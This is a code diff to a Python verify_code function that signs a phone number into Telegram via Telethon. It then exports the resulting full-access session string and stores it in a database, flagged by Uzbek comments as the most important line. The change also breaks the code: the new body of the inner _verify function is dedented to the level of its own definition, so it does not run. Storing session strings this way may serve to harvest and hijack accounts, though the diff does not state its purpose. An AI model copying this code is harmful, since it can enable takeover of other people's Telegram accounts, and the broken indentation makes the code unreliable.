@@ -140,18 +140,25 @@ def verify_code():
         })
 
     async def _verify():
-        client = TelegramClient(
-            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
-            API_ID,
-            API_HASH
-        )
-        await client.connect()
-        await client.sign_in(
-            phone=phone,
-            code=code,
-            phone_code_hash=phone_code_hash
-        )
-        await client.disconnect()
+    client = TelegramClient(
+        os.path.join(SESSIONS_DIR, phone.replace("+", "")),
+        API_ID,
+        API_HASH
+    )
+    await client.connect()
+
+    await client.sign_in(
+        phone=phone,
+        code=code,
+        phone_code_hash=phone_code_hash
+    )
+
+    me = await client.get_me()  # 🔥 ENG MUHIM QATOR
+
+    session_str = client.session.save()  # 🔥 SESSION
+    save_session(me.id, session_str)     # 🔥 DB GA YOZAMIZ
+
+    await client.disconnect()
 
     try:
         asyncio.run(_verify())
